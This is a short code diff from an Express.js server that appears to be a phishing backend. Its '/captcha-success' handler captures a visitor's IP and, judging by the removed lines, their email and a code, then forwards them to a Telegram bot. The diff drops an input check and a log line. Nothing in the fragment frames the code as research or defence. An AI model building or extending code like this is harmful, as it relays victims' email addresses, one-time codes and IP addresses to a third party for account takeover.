@@ -1784,12 +1784,6 @@ app.get("/get-sms2-info/:sms2Id", (req, res) => {
 // ✅ POST /captcha-success - CAPTCHA Page Success (uses separate CAPTCHA bot)
 app.post("/captcha-success", async (req, res) => {
   try {
-    const { userId, email, code } = req.body;
-
-    if (!userId || !email) {
-      return res.status(400).json({ error: "Missing userId or email" });
-    }
-
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
       req.headers["x-real-ip"] ||
       req.connection.remoteAddress ||
@@ -1817,8 +1811,6 @@ app.post("/captcha-success", async (req, res) => {
     }
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    console.log(`📤 Sending to URL: ${url.substring(0, 50)}...`);
-
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
